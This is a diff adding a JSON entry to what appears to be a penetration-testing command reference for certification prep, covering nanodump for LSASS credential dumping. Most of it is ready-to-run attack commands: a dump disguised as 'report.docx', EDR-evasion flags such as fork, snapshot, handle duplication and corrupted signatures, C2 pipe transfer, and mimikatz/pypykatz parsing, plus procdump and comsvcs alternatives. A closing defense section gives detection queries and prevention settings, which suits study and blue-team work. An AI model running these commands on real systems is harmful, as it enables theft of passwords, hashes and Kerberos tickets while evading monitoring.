@@ -1,0 +1,102 @@
+{
+  "id": "ad-nanodump",
+  "name": "nanodump - Evasive LSASS Memory Dump",
+  "command": "nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx",
+  "description": "nanodump creates a minidump of LSASS using direct syscalls and an invalid/malformed minidump signature to evade EDR and signature-based detection. It avoids MiniDumpWriteDump, can restore the dump signature offline, and supports fileless transfer. Used to harvest credentials from LSASS while bypassing common dump protections.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Post-Exploitation",
+  "subcategory": "Credential Dumping",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "fortra/nanodump",
+  "tags": [
+    "nanodump",
+    "lsass",
+    "minidump",
+    "edr-evasion",
+    "direct-syscalls",
+    "credentials"
+  ],
+  "mitre": [
+    "T1003.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== BASIC DUMP (disguised extension) ===\n  nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx\n  # Dump signature is corrupted on disk to evade scanners\n\n=== RESTORE SIGNATURE OFFLINE (attacker box) ===\n  python3 restore_signature.py report.docx\n  # Then parse with pypykatz/mimikatz\n\n=== FILELESS / DOWNLOAD OVER C2 ===\n  nanodump.x64.exe --fork --write \\\\127.0.0.1\\pipe\\x\n  # BOF version runs in-process under Cobalt Strike / havoc\n\n=== KEY EVASION OPTIONS ===\n  --fork           # dump a forked clone of LSASS (less likely to be flagged)\n  --snapshot       # use PssCaptureSnapshot instead of opening LSASS directly\n  --duplicate      # duplicate an existing LSASS handle (no OpenProcess)\n  --valid          # write a valid signature (skip corruption)\n\n=== PARSE THE DUMP ===\n  pypykatz lsa minidump report.docx\n  mimikatz: sekurlsa::minidump report.docx then sekurlsa::logonpasswords\n\n=== ALTERNATIVES ===\n  procdump -ma lsass.exe  # signed LOLBin, noisier\n  comsvcs.dll MiniDump    # LOLBin one-liner\n  lsassy / pypykatz       # remote collection",
+  "examples": [
+    {
+      "label": "Evasive dump with disguised name",
+      "command": "nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx"
+    },
+    {
+      "label": "Forked dump (stealthier)",
+      "command": "nanodump.x64.exe --fork --write C:\\Windows\\Temp\\out.log"
+    },
+    {
+      "label": "Parse dump offline",
+      "command": "pypykatz lsa minidump report.docx"
+    }
+  ],
+  "references": [
+    {
+      "title": "nanodump",
+      "url": "https://github.com/fortra/nanodump"
+    },
+    {
+      "title": "MITRE T1003.001 - LSASS Memory",
+      "url": "https://attack.mitre.org/techniques/T1003/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "post-procdump-lsass",
+      "note": "ProcDump/comsvcs LOLBin dump - noisier but signed.",
+      "rel": "alternative"
+    },
+    {
+      "id": "post-lsassy",
+      "note": "lsassy for remote LSASS collection.",
+      "rel": "alternative"
+    },
+    {
+      "id": "pypykatz-minidump",
+      "note": "Parse the resulting minidump offline.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Direct syscalls bypass userland API hooks EDR relies on; corrupting the minidump magic bytes defeats signature scanners; --fork/--snapshot/--duplicate avoid the heavily-monitored OpenProcess(LSASS) + MiniDumpWriteDump pattern.",
+    "prerequisites": "Local admin / SeDebugPrivilege on the target; nanodump binary or BOF.",
+    "impact": "Theft of plaintext passwords, NT hashes, and Kerberos tickets from LSASS while evading many EDRs.",
+    "detection": "[MITRE T1003.001] Process handle opens to lsass.exe with suspicious access masks; PssCaptureSnapshot on LSASS; process-clone (RtlCreateProcessReflection) of LSASS; use Sysmon 10 with LSASS as TargetImage; Defender ASR LSASS rule.",
+    "artifacts": "Minidump files with corrupted/odd headers; LSASS handle access from non-system processes; unusual syscall stubs.",
+    "splunk_spl": "index=windows (EventCode=10 TargetImage=\"*lsass.exe\") OR (EventCode=4656 ObjectName=\"*lsass*\")\n| stats count by SourceImage, GrantedAccess, Computer",
+    "elastic_kql": "winlog.event_id:10 and winlog.event_data.TargetImage:*lsass.exe",
+    "sentinel_kql": "DeviceEvents\n| where ActionType in (\"OpenProcessApiCall\",\"CreateRemoteThreadApiCall\") and FileName =~ \"lsass.exe\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields",
+    "sigma_rules": "win_lsass_memory_access_nanodump",
+    "prevention": "Enable Credential Guard; enable the Defender ASR rule blocking LSASS credential theft; run LSASS as PPL (RunAsPPL); restrict SeDebugPrivilege; EDR with kernel-level LSASS handle monitoring.",
+    "sources": [
+      "fortra/nanodump",
+      "https://attack.mitre.org/techniques/T1003/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "LSASS access via snapshot/fork (nanodump-style)",
+        "logic": "DeviceEvents\n| where ActionType == \"OpenProcessApiCall\" and FileName =~ \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"wininit.exe\",\"csrss.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1003.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "AV/EDR and legitimate crash-dump tooling accessing LSASS",
+        "tuning": "Allowlist known security products; alert on unsigned/uncommon initiating processes"
+      }
+    ]
+  }
+}
